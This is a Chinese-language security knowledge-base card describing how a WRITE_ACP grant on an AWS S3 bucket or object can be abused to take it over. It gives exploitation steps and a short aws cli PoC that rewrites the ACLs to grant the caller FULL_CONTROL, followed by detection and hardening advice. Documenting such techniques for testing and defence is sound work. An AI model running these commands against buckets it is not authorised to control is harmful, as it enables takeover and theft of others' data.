---
id: cloud-s3-write-acp-acl-takeover
title: S3 WRITE_ACP 权限滥用：改写对象/桶 ACL 把 FULL_CONTROL 授予自己实现接管
type: scenario
domain: cloud
path: cloud
technique: s3-write-acp-acl-takeover
tags:
- cloud
- aws
- s3
- acl
- iam
- permission
- takeover
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V574
  verified_at: '2026-11-12T11:04:07+08:00'
  notes: '已对照12921原文216行与全部8图核对（图片8/8读取成功，无失败）：图01 Server: AmazonS3、图02 nslookup 解析到 s3-us-west-2-w.amazonaws.com；WRITE_ACP 段落与原文一致——修改对象ACL把FULL_CONTROL授予自己规范ID、put-object-acl/put-bucket-acl --grant-full-control id=A_id，原文未附实际接管截图故confidence medium合理；卡片补充的 list-buckets --query Owner.ID 与 get-object-acl 属同语义正确命令。原文未标注版本(AWS S3服务无版本字段)，affected_versions空缺正确。dedup：首位为自身；与cloud-object-storage-bucket-acl-misconfig(公共读/写数据面)、cloud-s3-presigned-url-vpce-bypass、cloud-cloud-iam-aws-dangerous-permission-privesc 均非同链，库内无WRITE_ACP改写ACL接管卡，保留合理。内部链接均存在；frontmatter无sources与库内规范一致。PoC未复跑。'
url: /docs/cloud/cloud-s3-write-acp-acl-takeover/
draft: false
kb_aliases:
- WRITE_ACP
- S3 修改 ACL 夺权
- put-object-acl
- put-bucket-acl
- 规范 ID 接管对象
---

## 一句话结论

当 S3 桶或对象的 ACL 向攻击者授予了 `WRITE_ACP`（写 ACL）权限时，攻击者虽然未必能直接读对象，却可以调用 `put-object-acl`/`put-bucket-acl` 把对象或桶的 `FULL_CONTROL` 授予自己的规范 ID，从而完全接管该对象或桶（读取、覆盖、删除与再授权）。

## 原理

- S3 的访问控制有两套：Bucket Policy/IAM Policy 与 ACL。ACL 把权限授予「被授权者」（规范用户 ID、AWS 账号、AllUsers、AuthenticatedUsers），每条授权是以下权限之一：
  - 桶：`READ`（列对象）、`WRITE`（创建/覆盖/删除对象）、`READ_ACP`（读 ACL）、`WRITE_ACP`（写 ACL）、`FULL_CONTROL`；
  - 对象：`READ`（读对象内容）、`READ_ACP`、`WRITE_ACP`、`FULL_CONTROL`（对象 ACL 没有 `WRITE`）。
- `WRITE_ACP` 只表示「可以修改该资源的 ACL」，本身不含读/写数据的权限。但 ACL 修改者可以在新 ACL 里给自己授予 `FULL_CONTROL`，等于用一次 ACL 改写把「只能改 ACL」升级为「完全控制」。
- 每个 AWS 账号有一个规范用户 ID（canonical user ID），可用 `aws s3api list-buckets --query Owner.ID` 查看；`put-object-acl --grant-full-control id=<自己的规范ID>` 即把对象完全控制权转给自己。
- 对象的所有者默认是上传者；在未启用 BucketOwnerEnforced 的桶里，若桶策略允许匿名/其他账号 `PutObject`，后上传同名 Key 的人会成为该对象的新所有者，这也是「可写桶」能覆盖他人对象的原因。
- 该权限模型的历史配置常见于跨账号共享、日志投递、静态站资源桶：管理员为了「让对方能改权限」而误授 `WRITE_ACP`，实际等价于把资源控制权交出。
- 边界：桶启用 `BucketOwnerEnforced`（对象所有权强制桶主）后 ACL 被禁用，本手法不成立；S3 Block Public Access 也会拦截面向 AllUsers 的公开 ACL。

## 触发条件

- 目标桶/对象未启用 BucketOwnerEnforced，ACL 仍生效。
- 攻击者身份（IAM 用户/角色或匿名 AllUsers）在目标桶或对象的 ACL 中被授予 `WRITE_ACP`，或通过桶策略/账号授权间接获得 `s3:PutBucketAcl`/`s3:PutObjectAcl`。
- 攻击者知道自己的规范用户 ID，且能调用 S3 API（aws cli/SDK）。
- 目标未开启会阻止 ACL 修改的 Block Public Access/组织策略。

## 利用步骤

1. 确认自己的规范用户 ID：`aws s3api list-buckets --query 'Owner.ID' --output text`（或用 `aws sts get-caller-identity` 先确认身份）。
2. 读取目标对象/桶 ACL，确认自己（或 AllUsers/AuthenticatedUsers）被授予 `WRITE_ACP`：
   `aws s3api get-object-acl --bucket <bucket> --key <key>` / `aws s3api get-bucket-acl --bucket <bucket>`。
3. 改写对象 ACL，把 `FULL_CONTROL` 授予自己：
   `aws s3api put-object-acl --bucket <bucket> --key <key> --grant-full-control id=<自己的规范ID>`。
4. 或改写桶 ACL 接管整个桶：
   `aws s3api put-bucket-acl --bucket <bucket> --grant-full-control id=<自己的规范ID>`。
5. 验证：`aws s3 ls s3://<bucket>`、`aws s3 cp s3://<bucket>/<key> ./`，确认可读/可写。

## PoC

```bash
# 1) 取自己的规范用户 ID
MY_ID=$(aws s3api list-buckets --query 'Owner.ID' --output text)

# 2) 查看对象 ACL，确认 WRITE_ACP 授权
aws s3api get-object-acl --bucket <bucket> --key <key>

# 3) 把对象 FULL_CONTROL 授予自己（需 WRITE_ACP）
aws s3api put-object-acl --bucket <bucket> --key <key> \
  --grant-full-control id="$MY_ID"

# 4) 接管整个桶（需桶级 WRITE_ACP）
aws s3api put-bucket-acl --bucket <bucket> --grant-full-control id="$MY_ID"

# 5) 验证
aws s3 ls "s3://<bucket>"
aws s3 cp "s3://<bucket>/<key>" ./
```

说明：原文给出了 `list-buckets --profile A`、`put-object-acl --grant-full-control id=A_id`、`put-bucket-acl --grant-full-control id=A_id` 的命令与权限语义，未附实际接管截图；本库未复跑。

## 变体与关联

- 变体：桶级 `WRITE` 允许匿名/任意账号 `PutObject`，可用同名 Key 覆盖他人对象，覆盖后对象所有权转移到后上传者。
- 变体：`READ_ACP` 只泄露 ACL 结构（可据此枚举其他被授权者与账号 ID），不能直接改权限；需与 `WRITE_ACP` 区分。
- 关联：[[cloud-object-storage-bucket-acl-misconfig]]（公共读/公共读写 Bucket 的匿名访问与覆盖写）、[[cloud-cloud-iam-s3-anonymous-enum-export-xml-privilege-escalation]]（匿名枚举 + 桶内凭据泄露）。
- 边界：BucketOwnerEnforced 桶、Block Public Access、SCP 拒绝 `s3:Put*Acl` 时失效。

## 检测与防御

- 检测：CloudTrail 中的 `PutBucketAcl`/`PutObjectAcl` 调用，尤其是把 `FULL_CONTROL` 授予外部规范 ID 的请求；S3 访问日志中 ACL 变更后紧随的 `ListBucket`/`GetObject`。
- 防御：启用 Object Ownership 的 BucketOwnerEnforced 模式禁用 ACL；禁止对 AllUsers/AuthenticatedUsers 授予 `WRITE_ACP`；用桶策略与 IAM 策略替代 ACL 做最小权限授权。
- 加固：开启 Block Public Access；对 ACL 变更设置 CloudTrail 告警与 S3 Event 通知；定期用 `get-bucket-acl`/`get-object-acl` 审计异常授权。
